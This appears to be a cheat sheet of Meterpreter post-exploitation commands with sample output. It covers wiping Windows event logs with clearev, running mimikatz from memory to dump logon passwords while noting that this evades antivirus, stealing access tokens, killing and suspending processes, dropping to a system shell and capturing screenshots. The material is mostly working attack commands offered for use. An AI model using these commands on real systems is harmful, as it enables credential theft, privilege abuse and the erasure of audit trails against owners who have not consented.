## 1.)clearev clears the Application, system, and Security logs on the target system:
```python
meterpreter > clearev
[*] Wiping 1752 records from Application...
[*] Wiping 5053 records from System...
[*] Wiping 11888 records from Security...
```

## 2.)Executing command on target system
```python
meterpreter > execute -H -i -c -m -d calc.exe -f /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe -a '"sekurlsa::logonPasswords full" exit'
Process 3992 created.
Channel 2 created.
```
- The awesome thing about the execute command is that it allows us to run commands from memory without uploading the binary to the target, this way effectively bypassing several antivirus products.

## 3.)Retrieving the process id using getpid
```python
meterpreter > getpid
Current pid: 4068
```
- The 'getpid' command is used in Meterpreter to retrieve the process ID(PID) of the currently running process. 

## 4.)listing all privileges available for the current process using getprivs
```python
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
- The 'getprivs' command in Meterpreter is used to retrieve the current privileges of the process that the Meterpreter session is running under. 
- Privileges determine what actions a process is allowed to perform on a system, and can range from simple task like reading files, to more sensitive tasks like changing system settings or accessing protected resources. 

## Displaying the sid of current target system user
```python
meterpreter > getsid
Server SID: S-1-5-18
```
- The 'getsid' command in Meterpreter is used to retrieve the security identifier(SID) of the current user or a specified user on the target system.
- The SID is a unique identifier that is assigned to each user account and group on a Windows system. It is used to control access to resources and to enforce security policies.

## Displaying the uid of current target sytem user
```python
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
- The 'getuid' command is a Meterpreter command used to display the current user ID(UID) on the compromised system.
- It is commonly used by attackers to determine the level of access they have on a compromised system and to identify potential for privilege escalation.
Note - 'getuid' is used on Unix-based systems to retrieve the UID of the current user, while 'getsid' is used on Windows-based systems to retrieve the SID of a user account.

## Killing the process on target system
```python
meterpreter > kill 5100
Killing: 5100
```
- The 'kill' command will terminate one or more processes using their PID

## Filtering process by name
```python
meterpreter > pgrep explorer.exe
4868
```

## Terminating process by name
```python
meterpreter > pkill explorer.exe
Filtering on 'explorer.exe'
Killing: 6000
```

## Listing running processes
```python
meterpreter > ps
```

#### To display all the ps command options, we can use the -h flag
```python
meterpreter > ps -h
Usage: ps [ options ] pattern

Use the command with no arguments to see all running processes.
The following options can be used to filter those results:

OPTIONS:

    -A   Filter on architecture
    -c   Filter only child processes of the current shell
    -h   Help menu.
    -S   Filter on process name
    -s   Filter only SYSTEM processes
    -U   Filter on user name
    -x   Filter for exact matches rather than regex
```

## Listing out the registry sub keys
```python
meterpreter > reg enumkey -k HKLM\\Software
Enumerating: HKLM\Software

  Keys (14):

	AdventNet
	Apache Software Foundation
	JavaSoft
	JreMetrics
	Microsoft
	MozillaPlugins
	ODBC
	Oracle
	RubyInstaller
	ZOHO Corp
	Classes
	Clients
	Policies
	RegisteredApplications
```
- The `reg enumkey` command in Meterpreter is used to enumerate the subkeys of a registry key on the compromised system.
- In the example, the command `reg enumkey -k HKLM\Software` is being used to enumerate the subkeys of the `HKLM\Software` key in the Windows registry.
- `HKLM\Software` key contains information about installed software on the system, including configuration settings.

## droping from meterpreter to system command shell
```python
eterpreter > shell
Process 3964 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Stealing the access token of user to get same access
```python
meterpreter > steal_token 4316
Stolen token with username: VAGRANT-2008R2\Administrator
meterpreter > getuid
Server username: VAGRANT-2008R2\Administrator
```
- The `steal_token` command in Meterpreter is used to impersonate a user by stealing their access token, which allows an attacker to gain the same level of access as the targeted user.
- In the above example, the command `steal_token 4740` is being used to steal the access token of a process with the process ID(ID) of 4740. This means that the attacker will gain the same level of access as the user associated with the process.

## Changing the thread of meterpreter from new to old to gain more access to system
```python
meterpreter > rev2self
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
- The "rev2self" command in Meterpreter is used to change the context of the current thread back to the original thread that launched the Meterpreter payload. This original thread has more privileges and can perform more actions on the system.

## Suspending the process
```python
meterpreter > suspend 1332
[*] Suspending: 1332
[*] Targeting process with PID 1332...
```
- It is used to suspend a process running on the compromised system, allowing the attacker to manipulate its memory or other resources without being detected by the system.
- After suspending a process, the process is temporarily paused, which means it stops executing its instructions.

## Capturing screenshot using Meterpreter:
```python
meterpreter > screenshot
Screenshot saved to: /home/hyok/PrJcQWEJ.jpeg
```

## Displaying the Screenshot:
```python
┌──(hyok㉿kali)-[~]
└─$ eog PrJcQWEJ.jpeg
```